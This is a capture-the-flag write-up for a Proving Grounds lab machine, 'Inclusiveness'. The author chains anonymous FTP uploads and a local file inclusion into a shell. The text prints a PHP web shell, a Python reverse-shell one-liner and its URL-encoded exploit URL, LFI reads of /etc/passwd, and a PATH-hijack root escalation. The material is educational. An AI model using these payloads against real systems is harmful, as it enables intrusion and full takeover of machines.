---
title: Inclusiveness
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Inclusiveness
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ sudo nmap -Pn -p- -sSCV -A -oN full_tcp-scan.txt --open 192.168.143.14
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-17 16:00 +0900
Nmap scan report for 192.168.143.14
Host is up (0.089s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.240
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:1b:a3:92:83:a5:7a:15:bd:40:6e:0c:8d:98:27:7b (RSA)
|   256 cb:38:83:26:1a:9f:d3:5d:d3:fe:9b:a1:d3:bc:ab:2c (ECDSA)
|_  256 65:54:fc:2d:12:ac:e1:84:78:3e:00:23:fb:e4:c9:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=5/17%OT=21%CT=1%CU=37382%PV=Y%DS=4%DC=T%G=Y%TM=6A0967C
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=106%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FC%GC
OS:D=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M57
OS:8NNT11NW7%O4=M578ST11NW7%O5=M578ST11NW7%O6=M578ST11)WIN(W1=7120%W2=7120%
OS:W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M578NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   87.85 ms 192.168.45.1
2   87.74 ms 192.168.45.254
3   87.87 ms 192.168.251.1
4   87.95 ms 192.168.143.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.96 seconds
```

# FTP
## 21
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ ftp 192.168.143.14 
Connected to 192.168.143.14.
220 (vsFTPd 3.0.3)
Name (192.168.143.14:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||34818|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub
226 Directory send OK.

```

# HTTP
## 80

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ feroxbuster \
-u http://192.168.143.14 \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
```

http://192.168.143.14/robots.txt
![](../../../assets/images/Pasted%20image%2020260517171811.png)

```zsh
sudo curl -s --user-agent Googlebot http://192.168.143.14/robots.txt -v
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ sudo curl -s --user-agent Googlebot http://192.168.143.14/robots.txt -v
[sudo] password for kali: 
*   Trying 192.168.143.14:80...
* Established connection to 192.168.143.14 (192.168.143.14 port 80) from 192.168.45.240 port 41588 
* using HTTP/1.x
> GET /robots.txt HTTP/1.1
> Host: 192.168.143.14
> User-Agent: Googlebot
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sun, 17 May 2026 08:18:25 GMT
< Server: Apache/2.4.38 (Debian)
< Last-Modified: Sat, 08 Feb 2020 03:26:11 GMT
< ETag: "2d-59e08115bb1ef"
< Accept-Ranges: bytes
< Content-Length: 45
< Content-Type: text/plain
< 
User-agent: *
Disallow: /secret_information/
* Connection #0 to host 192.168.143.14:80 left intact
```

![](../../../assets/images/Pasted%20image%2020260517173155.png)

### Click english 

http://192.168.143.14/secret_information/?lang=en.php

*Like LFI*

http://192.168.143.14/secret_information/?lang=../../../../etc/passwd

![](../../../assets/images/Pasted%20image%2020260517175022.png)

http://192.168.143.14/secret_information/?lang=../../../../etc/vsftpd.conf

![](../../../assets/images/Pasted%20image%2020260517181205.png)

---

# Initial Access


```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ ftp 192.168.143.14
Connected to 192.168.143.14.
220 (vsFTPd 3.0.3)
Name (192.168.143.14:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52161|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||48584|)
150 Ok to send data.
100% |***********************************************************************|  5496       26.07 MiB/s    00:00 ETA
226 Transfer complete.
5496 bytes sent in 00:00 (29.57 KiB/s)
ftp> quit
221 Goodbye.
```

http://192.168.143.14/secret_information/?lang=../../../../../var/ftp/pub/php-reverse-shell.php

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ rlwrap -cAr nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.240] from (UNKNOWN) [192.168.143.14] 41290
Linux inclusiveness 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux
 19:42:54 up  3:46,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

```zsh
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@inclusiveness:/home/tom$
```

---

# Privilege Escalation

```zsh
www-data@inclusiveness:/home/tom$ ls -la
ls -la
total 104
drwxr-xr-x 15 tom  tom   4096 Jul 23  2020 .
drwxr-xr-x  3 root root  4096 Feb  8  2020 ..
-rw-------  1 tom  tom    684 Feb  8  2020 .ICEauthority
-rw-r--r--  1 root root     0 Jul 16  2020 .bash_history
-rw-r--r--  1 tom  tom    220 Feb  8  2020 .bash_logout
-rw-r--r--  1 tom  tom   3526 Feb  8  2020 .bashrc
drwx------ 10 tom  tom   4096 Feb  8  2020 .cache
drwx------ 10 tom  tom   4096 Feb  8  2020 .config
drwx------  3 tom  tom   4096 Feb  8  2020 .gnupg
drwx------  3 tom  tom   4096 Feb  8  2020 .local
-rw-r--r--  1 tom  tom    807 Feb  8  2020 .profile
drwx------  2 tom  tom   4096 Feb  8  2020 .ssh
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Desktop
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Documents
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Downloads
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Music
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Pictures
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Public
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Templates
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Videos
-rwxr-xr-x  1 tom  tom     33 May 17 22:47 local.txt
-rwsr-xr-x  1 root root 16976 Feb  8  2020 rootshell
-rw-r--r--  1 tom  tom    448 Feb  8  2020 rootshell.c
www-data@inclusiveness:/home/tom$ ls .ssh
ls .ssh
ls: cannot open directory '.ssh': Permission denied
```

```bash
www-data@inclusiveness:/home/tom$ cat rootshell.c
cat rootshell.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
        setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
```

```bash
www-data@inclusiveness:/home/tom$ ./rootshell
./rootshell
checking if you are tom...
you are: www-data
```

```zsh
www-data@inclusiveness:/home/tom$ echo "printf "tom"" > /tmp/whoami
echo "printf "tom"" > /tmp/whoami
```

```bash
www-data@inclusiveness:/home/tom$ cat /tmp/whoami
cat /tmp/whoami
printf tom
```

```bash
www-data@inclusiveness:/home/tom$ chmod +x /tmp/whoami
chmod +x /tmp/whoami
```

```bash
www-data@inclusiveness:/home/tom$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
```

```bash
www-data@inclusiveness:/home/tom$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```bash
www-data@inclusiveness:/home/tom$ ./rootshell
./rootshell
checking if you are tom...
you are: tom
access granted.
```

```bash
# python3 -c 'import pty; pty.spawn("/bin/bash")'

python3 -c 'import pty; pty.spawn("/bin/bash")'
root@inclusiveness:/home/tom# 
```

```bash
root@inclusiveness:/home/tom# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

```bash
root@inclusiveness:/home/tom# cat /root/proof.txt
cat /root/proof.txt

```

```bash
root@inclusiveness:/home/tom# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:bb:fa brd ff:ff:ff:ff:ff:ff
    inet 192.168.143.14/24 brd 192.168.143.255 scope global noprefixroute ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::106:c33c:22cf:d52/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Exploitation Guide for Inclusiveness
Summary
This machine is exploited via a local file inclusion vulnerability in a web application and an anonymous FTP service allowing the attacker to write any file to disk. It is escalated by hijacking the PATH variable in conjunction with SUID permissions on a custom binary.

Enumeration
Nmap
We start our enumeration by doing a port scan on the target using nmap and discover a few open ports:

kali@kali:~$ sudo nmap 192.168.120.69
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 10:25 EDT
Nmap scan report for 192.168.120.69
Host is up (0.030s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 126.65 seconds
We will run nmap again, only this time we are going to be doing an aggressive scan using the -A flag that will assist us in identifying more information regarding the services running on each open port:

kali@kali:~$ sudo nmap -A -p 21,22,80 192.168.120.69
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 10:27 EDT
Nmap scan report for 192.168.120.69
Host is up (0.030s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08 21:51 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.118.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:1b:a3:92:83:a5:7a:15:bd:40:6e:0c:8d:98:27:7b (RSA)
|   256 cb:38:83:26:1a:9f:d3:5d:d3:fe:9b:a1:d3:bc:ab:2c (ECDSA)
|_  256 65:54:fc:2d:12:ac:e1:84:78:3e:00:23:fb:e4:c9:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.4 (94%), Linux 2.6.18 - 2.6.22 
--SNIP--
kali@kali:~$
Web Enumeration
Navigating to the default page on port 80 (http://192.168.120.69/) only shows the default Apache page. However, viewing robots.txt (http://192.168.120.69/robots.txt), we are greeted with the following:

You are not a search engine! You can't read my robots.txt! 
We can easily bypass this restriction with curl:

kali@kali:~$ curl -A "GoogleBot" http://192.168.120.69/robots.txt
User-agent: *
Disallow: /secret_information/
kali@kali:~$
We discover a new directory: /secret_information/. Navigating there (http://192.168.120.69/secret_information/), we are met with a web page that describes "DNS Zone Transfer Attack". The web page contains two hyperlinks English and Spanish:

DNS Zone Transfer Attack

english spanish
DNS Zone transfer is the process where a DNS server passes a copy of part of it's database (which is called a "zone") to another DNS server. It's how you can have more than one DNS server able to answer queries about a particular zone; there is a Master DNS server, and one or more Slave DNS servers, and the slaves ask the master for a copy of the records for that zone. A basic DNS Zone Transfer Attack isn't very fancy: you just pretend you are a slave and ask the master for a copy of the zone records. And it sends you them; DNS is one of those really old-school Internet protocols that was designed when everyone on the Internet literally knew everyone else's name and address, and so servers trusted each other implicitly. It's worth stopping zone transfer attacks, as a copy of your DNS zone may reveal a lot of topological information about your internal network. In particular, if someone plans to subvert your DNS, by poisoning or spoofing it, for example, they'll find having a copy of the real data very useful. So best practice is to restrict Zone transfers. At the bare minimum, you tell the master what the IP addresses of the slaves are and not to transfer to anyone else. In more sophisticated set-ups, you sign the transfers. So the more sophisticated zone transfer attacks try and get round these controls. 
Exploitation
LFI Vulnerability
Clicking on the English hyperlink, the URI changes to http://192.168.120.69/secret_information/?lang=en.php.

We can exploit this LFI vulnerability by navigating to http://192.168.120.69/secret_information/?lang=/etc/passwd:

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin avahi-autoipd:x:107:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin avahi:x:113:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:114:121::/var/lib/saned:/usr/sbin/nologin colord:x:115:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:116:123::/var/lib/geoclue:/usr/sbin/nologin tom:x:1000:1000:Tom,,,:/home/tom:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ftp:x:118:125:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
We saw from the initial scan that the FTP service is available as anonymous and /pub is a writable directory. We will utilize LFI to disclose information in the vsftpd.conf config file via http://192.168.120.69/secret_information/?lang=/etc/vsftpd.conf and see the following at the end of the file:

anon_root=/var/ftp/ write_enable=YES # 
Remote Code Execution
To achieve remote code execution, we will prepare a malicious PHP file and then upload it using anonymous FTP:

kali@kali:~$ cat backdoor.php 
<?php system($_GET['cmd']);?>
kali@kali:~$ ftp 192.168.120.69
Connected to 192.168.120.69.
220 (vsFTPd 3.0.3)
Name (192.168.120.69:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /pub
250 Directory successfully changed.
ftp> put backdoor.php
local: backdoor.php remote: backdoor.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
30 bytes sent in 0.00 secs (1.1444 MB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-rw-    1 118      125            30 Mar 17 00:45 backdoor.php
226 Directory send OK.
ftp> bye
221 Goodbye.
We can verify RCE by navigating to http://192.168.120.69/secret_information/?lang=/var/ftp/pub/backdoor.php&cmd=id. The command was executed successfully:

uid=33(www-data) gid=33(www-data) groups=33(www-data) 
Using Python, we will generate a reverse shell and also URL-encode the payload to ensure a smooth transit to our target. Be sure to change the IP address and port number on your payload as needed:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.249",25));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
Below is an example of what the URL-encoded payload would look like:

%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%32%34%39%22%2c%32%35%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27
The complete URL, including the final payload, is now ready; however, we first need to set up our netcat listener to catch our reverse shell. We will start our listener on port 25, and then navigate to the following URL to trigger the reverse shell:

http://192.168.249.14/secret_information/?lang=/var/ftp/pub/cmd.php&cmd=%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%32%34%39%22%2c%32%35%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27
If we look back to our listener, our shell should have arrived:

kali@kali:~$ sudo nc -lvp 25
listening on [any] 25 …
192.168.249.14: inverse host lookup failed: Unknown host
connect to [192.168.49.249] from (UNKNOWN) [192.168.249.14] 52006
/bin/sh: 0: can’t access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@inclusiveness:/var/www/html/secret_information$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Escalation
SUID
The first step is to identify all programs or files that have SUID bits enabled:

www-data@inclusiveness:/var/www/html/secret_information$ find / -perm -u=s -type f 2>/dev/null
<_information$ find / -perm -u=s -type f 2>/dev/null     
...
/usr/sbin/pppd
/home/tom/rootshell
Immediately, /home/tom/rootshell sticks out. Inside /home/tom, we find an interesting binary rootshell with its source code in rootshell.c:

www-data@inclusiveness:/var/www/html/secret_information$ cd /home/tom && ls -la
...
-rwsr-xr-x  1 root root 16976 Feb  8 13:01 rootshell
-rw-r--r--  1 tom  tom    448 Feb  8 13:01 rootshell.c
Let's inspect the source code:

www-data@inclusiveness:/home/tom$ cat rootshell.c
cat rootshell.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
        setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
Looking at the source code, if the file is executed as the user tom by calling the function for whoami program for validation, then we will get a privileged shell; else, it will print user-ID of the user that is currently logged in. In other words, the rootshell program gives a high privilege shell if the output of the whoami program is tom.

We can easily take advantage of this misconfiguration by abusing the PATH variable. Here, we create a file named whoami in the /tmp directory and write the following bash code to print tom:

www-data@inclusiveness:/home/tom$ cd /tmp
cd /tmp
www-data@inclusiveness:/tmp$ echo "printf "tom"" > whoami
echo "printf "tom"" > whoami
www-data@inclusiveness:/tmp$ chmod 777 whoami
chmod 777 whoami
www-data@inclusiveness:/tmp$
Next, we add a temporary PATH variable with the help of the following command:

www-data@inclusiveness:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
www-data@inclusiveness:/tmp$ echo $PATH
echo $PATH
/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin
www-data@inclusiveness:/tmp$ 
When everything is done, we can execute the rootshell program to get the root shell:

www-data@inclusiveness:/tmp$ cd /home/tom
cd /home/tom
www-data@inclusiveness:/home/tom$ ./rootshell
./rootshell
checking if you are tom...
you are: tom
access granted.
# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

</details>